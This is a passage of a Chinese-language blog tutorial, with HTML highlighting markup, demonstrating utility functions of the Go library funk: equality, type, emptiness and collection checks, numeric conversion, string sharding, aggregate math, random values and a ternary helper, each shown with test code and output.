[北京 南京]</span><br><span class="hljs-comment">--- PASS: TestGetToSlice (0.00s)</span><br><span class="hljs-comment">PASS</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><h2 id="6-判断操作"><a href="#6-判断操作" class="headerlink" title="6. 判断操作"></a>6. 判断操作</h2><h3 id="6-1-判断相等"><a href="#6-1-判断相等" class="headerlink" title="6.1 判断相等"></a>6.1 判断相等</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs Go"><span class="hljs-keyword">type</span> Student <span class="hljs-keyword">struct</span> &#123;<br>Name <span class="hljs-type">string</span><br>Age  <span class="hljs-type">int</span><br>&#125;<br><span class="hljs-comment">// 比较</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">TestIsEqual</span><span class="hljs-params">(t *testing.T)</span></span> &#123;<br><span class="hljs-comment">// 对比字符串</span><br>fmt.Println(<span class="hljs-string">&quot;对比字符串:&quot;</span>, funk.IsEqual(<span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>))<br><span class="hljs-comment">// 对比int</span><br>fmt.Println(<span class="hljs-string">&quot;对比int:&quot;</span>, funk.IsEqual(<span class="hljs-number">1</span>, <span class="hljs-number">1</span>))<br><span class="hljs-comment">// 对比float64</span><br>fmt.Println(<span class="hljs-string">&quot;对比float64:&quot;</span>, funk.IsEqual(<span class="hljs-type">float64</span>(<span class="hljs-number">1</span>), <span class="hljs-type">float64</span>(<span class="hljs-number">1</span>)))<br><span class="hljs-comment">// 对比结构体</span><br>stu1 := Student&#123;Name: <span class="hljs-string">&quot;张三&quot;</span>, Age: <span class="hljs-number">18</span>&#125;<br>stu2 := Student&#123;Name: <span class="hljs-string">&quot;张三&quot;</span>, Age: <span class="hljs-number">18</span>&#125;<br>fmt.Println(<span class="hljs-string">&quot;对比结构体:&quot;</span>, funk.IsEqual(stu1, stu2))<br>&#125;<br><span class="hljs-comment">/**输出</span><br><span class="hljs-comment">=== RUN   TestIsEqual</span><br><span class="hljs-comment">对比字符串: true</span><br><span class="hljs-comment">对比int: true</span><br><span class="hljs-comment">对比float64: true</span><br><span class="hljs-comment">对比结构体: true</span><br><span class="hljs-comment">--- PASS: TestIsEqual (0.00s)</span><br><span class="hljs-comment">PASS</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><h3 id="6-2-判断类型一致"><a href="#6-2-判断类型一致" class="headerlink" title="6.2 判断类型一致"></a>6.2 判断类型一致</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs Go"><span class="hljs-comment">// 判断类型是否一样</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">TestIsType</span><span class="hljs-params">(t *testing.T)</span></span> &#123;<br><span class="hljs-keyword">var</span> a, b <span class="hljs-type">int8</span> = <span class="hljs-number">1</span>, <span class="hljs-number">2</span><br>fmt.Println(<span class="hljs-string">&quot;A: &quot;</span>, funk.IsType(a, b))<br>c := <span class="hljs-number">3</span><br>d := <span class="hljs-string">&quot;3&quot;</span><br>fmt.Println(<span class="hljs-string">&quot;B:&quot;</span>, funk.IsType(c, d))<br>&#125;<br><span class="hljs-comment">/**输出</span><br><span class="hljs-comment">=== RUN   TestIsType</span><br><span class="hljs-comment">A:  true</span><br><span class="hljs-comment">B: false</span><br><span class="hljs-comment">--- PASS: TestIsType (0.00s)</span><br><span class="hljs-comment">PASS</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><h3 id="6-3-判断array-slice"><a href="#6-3-判断array-slice" class="headerlink" title="6.3 判断array|slice"></a>6.3 判断<code>array|slice</code></h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs Go"><span class="hljs-comment">// 判断是否是array|slice</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">TestCollect</span><span class="hljs-params">(t *testing.T)</span></span> &#123;<br><span class="hljs-comment">// slice</span><br>a := []<span class="hljs-type">int</span>&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>&#125;<br><span class="hljs-comment">// 字符串</span><br>b := <span class="hljs-string">&quot;str&quot;</span><br><span class="hljs-comment">// 自定义结构体切片</span><br>c := []Student&#123;<br>&#123;Name: <span class="hljs-string">&quot;张三&quot;</span>, Age: <span class="hljs-number">18</span>&#125;,<br>&#123;Name: <span class="hljs-string">&quot;李四&quot;</span>, Age: <span class="hljs-number">18</span>&#125;,<br>&#125;<br><span class="hljs-comment">// 数组类型</span><br>d := [<span class="hljs-number">2</span>]<span class="hljs-type">string</span>&#123;<span class="hljs-string">&quot;c&quot;</span>, <span class="hljs-string">&quot;go&quot;</span>&#125;<br>fmt.Println(<span class="hljs-string">&quot;a:&quot;</span>, funk.IsCollection(a))<br>fmt.Println(<span class="hljs-string">&quot;b:&quot;</span>, funk.IsCollection(b))<br>fmt.Println(<span class="hljs-string">&quot;c:&quot;</span>, funk.IsCollection(c))<br>fmt.Println(<span class="hljs-string">&quot;d:&quot;</span>, funk.IsCollection(d))<br>&#125;<br><span class="hljs-comment">/**输出</span><br><span class="hljs-comment">=== RUN   TestCollect</span><br><span class="hljs-comment">a: true</span><br><span class="hljs-comment">b: false</span><br><span class="hljs-comment">c: true</span><br><span class="hljs-comment">d: true</span><br><span class="hljs-comment">--- PASS: TestCollect (0.00s)</span><br><span class="hljs-comment">PASS</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><h3 id="6-4-判断空"><a href="#6-4-判断空" class="headerlink" title="6.4 判断空"></a>6.4 判断空</h3><ul><li><code>funk.IsEmpty(obj interface&#123;&#125;)</code>: 判断为空。</li><li><code>funk.NotEmpty(obj interface&#123;&#125;)</code>: 判断不为空。</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs Go"><span class="hljs-comment">// 判断是否为空</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">TestIsEmpty</span><span class="hljs-params">(t *testing.T)</span></span> &#123;<br><span class="hljs-comment">// 空结构体</span><br>fmt.Println(<span class="hljs-string">&quot;空结构体&quot;</span>, funk.IsEmpty([]<span class="hljs-type">int</span>&#123;&#125;))<br><span class="hljs-comment">// 空字符串</span><br>fmt.Println(<span class="hljs-string">&quot;空字符串:&quot;</span>, funk.IsEmpty(<span class="hljs-string">&quot;&quot;</span>))<br><span class="hljs-comment">// 判断数字0</span><br>fmt.Println(<span class="hljs-string">&quot;0:&quot;</span>, funk.IsEmpty(<span class="hljs-number">0</span>))<br><span class="hljs-comment">// 判断字符串&#x27;0&#x27;</span><br>fmt.Println(<span class="hljs-string">&quot;&#x27;0&#x27;:&quot;</span>, funk.IsEmpty(<span class="hljs-string">&quot;0&quot;</span>))<br><span class="hljs-comment">// nil</span><br>fmt.Println(<span class="hljs-string">&quot;nil:&quot;</span>, funk.IsEmpty(<span class="hljs-literal">nil</span>))<br>&#125;<br><span class="hljs-comment">/**输出</span><br><span class="hljs-comment">=== RUN   TestIsEmpty</span><br><span class="hljs-comment">空结构体 true</span><br><span class="hljs-comment">空字符串: true</span><br><span class="hljs-comment">0: true</span><br><span class="hljs-comment">&#x27;0&#x27;: false</span><br><span class="hljs-comment">nil: true</span><br><span class="hljs-comment">--- PASS: TestEmpty (0.00s)</span><br><span class="hljs-comment">PASS</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><h2 id="7-类型转换"><a href="#7-类型转换" class="headerlink" title="7. 类型转换"></a>7. 类型转换</h2><h3 id="7-1-任意数字转float64"><a href="#7-1-任意数字转float64" class="headerlink" title="7.1 任意数字转float64"></a>7.1 任意数字转<code>float64</code></h3><blockquote><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">ToFloat64</span><span class="hljs-params">(x <span class="hljs-keyword">interface</span>&#123;&#125;)</span></span> (<span class="hljs-type">float64</span>, <span class="hljs-type">bool</span>)<br></code></pre></td></tr></table></figure></blockquote><ul><li>将任何数字类型，转成<code>float64</code>类型，**@注:只能是数字类型: uint8、uint16、uint32、uint64、int、int8、int16、int32、int64、float32、float64**</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs Go"><span class="hljs-comment">// 数字型转浮点型</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">TestToFloat64</span><span class="hljs-params">(t *testing.T)</span></span> &#123;<br><span class="hljs-comment">// int to float64</span><br>d1, _ := funk.ToFloat64(<span class="hljs-number">10</span>)<br>fmt.Printf(<span class="hljs-string">&quot;d1 = %v %T \n&quot;</span>, d1, d1)<br><span class="hljs-comment">//@会失败</span><br>d2, err := funk.ToFloat64(<span class="hljs-string">&quot;10&quot;</span>)<br>fmt.Printf(<span class="hljs-string">&quot;d2 = %v %v \n&quot;</span>, d2, err)<br>&#125;<br><span class="hljs-comment">/**输出</span><br><span class="hljs-comment">=== RUN   TestToFloat64</span><br><span class="hljs-comment">d1 = 10 float64 </span><br><span class="hljs-comment">d2 = 0 false </span><br><span class="hljs-comment">--- PASS: TestToFloat64 (0.00s)</span><br><span class="hljs-comment">PASS</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><h3 id="7-2-将X转成-X"><a href="#7-2-将X转成-X" class="headerlink" title="7.2 将X转成[]X"></a>7.2 将<code>X</code>转成<code>[]X</code></h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs Go"><span class="hljs-comment">// 返回任一类型的类型切片</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">TestSliceOf</span><span class="hljs-params">(t *testing.T)</span></span> &#123;<br>a := []<span class="hljs-type">int</span>&#123;<span class="hljs-number">10</span>, <span class="hljs-number">20</span>, <span class="hljs-number">30</span>&#125;<br><span class="hljs-comment">// []int 转成 [][]int</span><br>fmt.Printf(<span class="hljs-string">&quot;%v %T \n&quot;</span>, funk.SliceOf(a), funk.SliceOf(a))<br><span class="hljs-comment">// string 转成 []string</span><br>fmt.Printf(<span class="hljs-string">&quot;%v %T \n&quot;</span>, funk.SliceOf(<span class="hljs-string">&quot;go&quot;</span>), funk.SliceOf(<span class="hljs-string">&quot;go&quot;</span>))<br>&#125;<br><span class="hljs-comment">/**输出</span><br><span class="hljs-comment">=== RUN   TestSliceOf</span><br><span class="hljs-comment">[[10 20 30]] [][]int </span><br><span class="hljs-comment">[go] []string </span><br><span class="hljs-comment">--- PASS: TestSliceOf (0.00s)</span><br><span class="hljs-comment">PASS</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><h2 id="8-字符串操作"><a href="#8-字符串操作" class="headerlink" title="8.字符串操作"></a>8.字符串操作</h2><h3 id="8-1-根据字符串生成切片"><a href="#8-1-根据字符串生成切片" class="headerlink" title="8.1 根据字符串生成切片"></a>8.1 根据字符串生成切片</h3><blockquote><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">func <span class="hljs-constructor">Shard(<span class="hljs-params">str</span> <span class="hljs-params">string</span>, <span class="hljs-params">width</span> <span class="hljs-params">int</span>, <span class="hljs-params">depth</span> <span class="hljs-params">int</span>, <span class="hljs-params">restOnly</span> <span class="hljs-params">bool</span>)</span> <span class="hljs-literal">[]</span><span class="hljs-built_in">string</span><br></code></pre></td></tr></table></figure></blockquote><ul><li><code>width</code>: 代表根据几个字节生成一个元素。</li><li><code>depth</code>: 将字符串前<code>x</code>个元素转成切片。</li><li><code>restOnly</code>: 当为<code>false</code>时，最后一个元素为原字符串,当为<code>true</code>时,最后一个元素为原字符串剩余元素</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs Go"><span class="hljs-comment">// 将自定长度字符串生成切片</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">TestShard</span><span class="hljs-params">(t *testing.T)</span></span> &#123;<br>tokey := <span class="hljs-string">&quot;Hello,Word&quot;</span><br>shard := funk.Shard(tokey, <span class="hljs-number">1</span>, <span class="hljs-number">5</span>, <span class="hljs-literal">false</span>)<br>shard1 := funk.Shard(tokey, <span class="hljs-number">1</span>, <span class="hljs-number">5</span>, <span class="hljs-literal">true</span>)<br>fmt.Println(<span class="hljs-string">&quot;shard: &quot;</span>, shard)<br>fmt.Println(<span class="hljs-string">&quot;shard1: &quot;</span>, shard1)<br>shard2 := funk.Shard(tokey, <span class="hljs-number">2</span>, <span class="hljs-number">5</span>, <span class="hljs-literal">false</span>)<br>shard22 := funk.Shard(tokey, <span class="hljs-number">2</span>, <span class="hljs-number">5</span>, <span class="hljs-literal">true</span>)<br>fmt.Println(<span class="hljs-string">&quot;shard2: &quot;</span>, shard2)<br>fmt.Println(<span class="hljs-string">&quot;shard22: &quot;</span>, shard22)<br>&#125;<br><span class="hljs-comment">/**</span><br><span class="hljs-comment">=== RUN   TestShard</span><br><span class="hljs-comment">shard:  [H e l l o Hello,Word]</span><br><span class="hljs-comment">shard1:  [H e l l o ,Word]</span><br><span class="hljs-comment">shard2:  [He ll o, Wo rd Hello,Word]</span><br><span class="hljs-comment">shard22:  [He ll o, Wo rd ]</span><br><span class="hljs-comment">--- PASS: TestShard (0.00s)</span><br><span class="hljs-comment">PASS</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><h2 id="9-数字计算"><a href="#9-数字计算" class="headerlink" title="9.数字计算"></a>9.数字计算</h2><h3 id="9-1-最大值-Max"><a href="#9-1-最大值-Max" class="headerlink" title="9.1 最大值(Max)"></a>9.1 最大值(<code>Max</code>)</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">TestMax</span><span class="hljs-params">(t *testing.T)</span></span> &#123;<br><span class="hljs-comment">// 求最大int</span><br>fmt.Println(<span class="hljs-string">&quot;MaxInt:&quot;</span>, funk.MaxInt([]<span class="hljs-type">int</span>&#123;<span class="hljs-number">30</span>, <span class="hljs-number">10</span>, <span class="hljs-number">8</span>, <span class="hljs-number">11</span>&#125;))<br><span class="hljs-comment">// 求最大浮点数</span><br>fmt.Println(<span class="hljs-string">&quot;MaxFloat64:&quot;</span>, funk.MaxFloat64([]<span class="hljs-type">float64</span>&#123;<span class="hljs-number">10.2</span>, <span class="hljs-number">11.0</span>, <span class="hljs-number">8.03</span>&#125;))<br><span class="hljs-comment">// 求最大字符串</span><br>fmt.Println(<span class="hljs-string">&quot;MaxString:&quot;</span>, funk.MaxString([]<span class="hljs-type">string</span>&#123;<span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-string">&quot;d&quot;</span>, <span class="hljs-string">&quot;c&quot;</span>, <span class="hljs-string">&quot;b&quot;</span>&#125;))<br>&#125;<br><span class="hljs-comment">/**输出</span><br><span class="hljs-comment">=== RUN   TestMaxInt</span><br><span class="hljs-comment">MaxInt: 30</span><br><span class="hljs-comment">MaxFloat64: 11</span><br><span class="hljs-comment">MaxString: d</span><br><span class="hljs-comment">--- PASS: TestMaxInt (0.00s)</span><br><span class="hljs-comment">PASS</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><h3 id="9-2-最小值-Min"><a href="#9-2-最小值-Min" class="headerlink" title="9.2 最小值(Min)"></a>9.2 最小值(<code>Min</code>)</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">TestMin</span><span class="hljs-params">(t *testing.T)</span></span> &#123;<br><span class="hljs-comment">// 求最小int</span><br>fmt.Println(<span class="hljs-string">&quot;MinInt:&quot;</span>, funk.MinInt([]<span class="hljs-type">int</span>&#123;<span class="hljs-number">30</span>, <span class="hljs-number">10</span>, <span class="hljs-number">8</span>, <span class="hljs-number">11</span>&#125;))<br><span class="hljs-comment">// 求最小浮点数</span><br>fmt.Println(<span class="hljs-string">&quot;MinFloat64:&quot;</span>, funk.MinFloat64([]<span class="hljs-type">float64</span>&#123;<span class="hljs-number">10.2</span>, <span class="hljs-number">11.0</span>, <span class="hljs-number">8.03</span>&#125;))<br><span class="hljs-comment">// 求最小字符串</span><br>fmt.Println(<span class="hljs-string">&quot;MinString:&quot;</span>, funk.MinString([]<span class="hljs-type">string</span>&#123;<span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-string">&quot;d&quot;</span>, <span class="hljs-string">&quot;c&quot;</span>, <span class="hljs-string">&quot;b&quot;</span>&#125;))<br>&#125;<br><span class="hljs-comment">/**输出</span><br><span class="hljs-comment">=== RUN   TestMin</span><br><span class="hljs-comment">MinInt: 8</span><br><span class="hljs-comment">MinFloat64: 8.03</span><br><span class="hljs-comment">MinString: a</span><br><span class="hljs-comment">--- PASS: TestMin (0.00s)</span><br><span class="hljs-comment">PASS</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><h3 id="9-3-求和-Sum"><a href="#9-3-求和-Sum" class="headerlink" title="9.3 求和(Sum)"></a>9.3 求和(<code>Sum</code>)</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// 求和</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">TestSum</span><span class="hljs-params">(t *testing.T)</span></span> &#123;<br><span class="hljs-comment">// 整型</span><br>a := []<span class="hljs-type">int</span>&#123;<span class="hljs-number">5</span>, <span class="hljs-number">10</span>, <span class="hljs-number">15</span>, <span class="hljs-number">20</span>&#125;<br>fmt.Println(<span class="hljs-string">&quot;int sum:&quot;</span>, funk.Sum(a))<br><span class="hljs-comment">// 浮点型</span><br>b := []<span class="hljs-type">float64</span>&#123;<span class="hljs-number">5.11</span>, <span class="hljs-number">2.23</span>, <span class="hljs-number">3.31</span>, <span class="hljs-number">0.32</span>&#125;<br>fmt.Println(<span class="hljs-string">&quot;float64 sum:&quot;</span>, funk.Sum(b))<br>&#125;<br><span class="hljs-comment">/**输出</span><br><span class="hljs-comment">=== RUN   TestSum</span><br><span class="hljs-comment">int sum: 50</span><br><span class="hljs-comment">float64 sum: 10.97</span><br><span class="hljs-comment">--- PASS: TestSum (0.00s)</span><br><span class="hljs-comment">PASS</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><h3 id="9-4-求乘积-Product"><a href="#9-4-求乘积-Product" class="headerlink" title="9.4 求乘积(Product)"></a>9.4 求乘积(<code>Product</code>)</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// 求乘积</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">TestProduct</span><span class="hljs-params">(t *testing.T)</span></span> &#123;<br><span class="hljs-comment">// 整型</span><br>a := []<span class="hljs-type">int</span>&#123;<span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>&#125;<br>fmt.Println(<span class="hljs-string">&quot;int Product:&quot;</span>, funk.Product(a))<br><span class="hljs-comment">// 浮点型</span><br>b := []<span class="hljs-type">float64</span>&#123;<span class="hljs-number">1.1</span>, <span class="hljs-number">1.2</span>, <span class="hljs-number">1.3</span>, <span class="hljs-number">1.4</span>&#125;<br>fmt.Println(<span class="hljs-string">&quot;float64 Product:&quot;</span>, funk.Product(b))<br>&#125;<br><span class="hljs-comment">/**输出</span><br><span class="hljs-comment">=== RUN   TestProduct</span><br><span class="hljs-comment">int Product: 120</span><br><span class="hljs-comment">float64 Product: 2.4024</span><br><span class="hljs-comment">--- PASS: TestProduct (0.00s)</span><br><span class="hljs-comment">PASS</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><h2 id="10-其他操作"><a href="#10-其他操作" class="headerlink" title="10. 其他操作"></a>10. 其他操作</h2><h3 id="10-1-生成随机数"><a href="#10-1-生成随机数" class="headerlink" title="10.1 生成随机数"></a>10.1 生成随机数</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// 生成随机数</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">TestRandom</span><span class="hljs-params">(t *testing.T)</span></span> &#123;<br><span class="hljs-keyword">for</span> i := <span class="hljs-number">1</span>; i &lt;= <span class="hljs-number">3</span>; i++ &#123;<br><span class="hljs-comment">// 生成任意数字类型</span><br>fmt.Println(funk.RandomInt(<span class="hljs-number">1</span>, <span class="hljs-number">100</span>))<br>&#125;<br>&#125;<br><span class="hljs-comment">/**输出</span><br><span class="hljs-comment">=== RUN   TestRandom</span><br><span class="hljs-comment">24</span><br><span class="hljs-comment">79</span><br><span class="hljs-comment">21</span><br><span class="hljs-comment">--- PASS: TestRandom (0.00s)</span><br><span class="hljs-comment">PASS</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><h3 id="10-2-生成随机字符串"><a href="#10-2-生成随机字符串" class="headerlink" title="10.2 生成随机字符串"></a>10.2 生成随机字符串</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// 生成随机字符串</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">TestRandomString</span><span class="hljs-params">(t *testing.T)</span></span> &#123;<br><span class="hljs-keyword">for</span> i := <span class="hljs-number">1</span>; i &lt;= <span class="hljs-number">3</span>; i++ &#123;<br><span class="hljs-comment">// 从默认字符串生成</span><br>fmt.Println(<span class="hljs-string">&quot;从默认字符串生成:&quot;</span>, funk.RandomString(i))<br><span class="hljs-comment">// 从指的字符串生成</span><br>fmt.Println(<span class="hljs-string">&quot;从指定字符串生成:&quot;</span>, funk.RandomString(i, []<span class="hljs-type">rune</span>&#123;<span class="hljs-string">&#x27;您&#x27;</span>, <span class="hljs-string">&#x27;好&#x27;</span>, <span class="hljs-string">&#x27;北&#x27;</span>, <span class="hljs-string">&#x27;京&#x27;</span>&#125;))<br>&#125;<br>&#125;<br><span class="hljs-comment">/**输出</span><br><span class="hljs-comment">=== RUN   TestRandomString</span><br><span class="hljs-comment">从默认字符串生成: B</span><br><span class="hljs-comment">从指定字符串生成: 京</span><br><span class="hljs-comment">从默认字符串生成: Ln</span><br><span class="hljs-comment">从指定字符串生成: 好北</span><br><span class="hljs-comment">从默认字符串生成: Dsc</span><br><span class="hljs-comment">从指定字符串生成: 您北京</span><br><span class="hljs-comment">--- PASS: TestRandomString (0.00s)</span><br><span class="hljs-comment">PASS</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><h3 id="10-3-三元运算"><a href="#10-3-三元运算" class="headerlink" title="10.3 三元运算"></a>10.3 三元运算</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// 三元运算</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">TestShortIf</span><span class="hljs-params">(t *testing.T)</span></span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;10 &gt; 5 :&quot;</span>, funk.ShortIf(<span class="hljs-number">10</span> &gt; <span class="hljs-number">5</span>, <span class="hljs-number">10</span>, <span class="hljs-number">5</span>))<br>fmt.Println(<span class="hljs-string">&quot;10.0 == 10 : &quot;</span>, funk.ShortIf(<span class="hljs-number">10.0</span> == <span class="hljs-number">10</span>, <span class="hljs-string">&quot;yes&quot;</span>, <span class="hljs-string">&quot;no&quot;</span>))<br>fmt.Println(<span class="hljs-string">&quot;&#x27;a&#x27; == &#x27;b&#x27; : &quot;</span>, funk.ShortIf(<span class="hljs-string">&#x27;a&#x27;</span> == <span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-string">&quot;equal chars&quot;</span>, <span class="hljs-string">&quot;unequal chars&quot;</span>))<br>&#125;<br><span 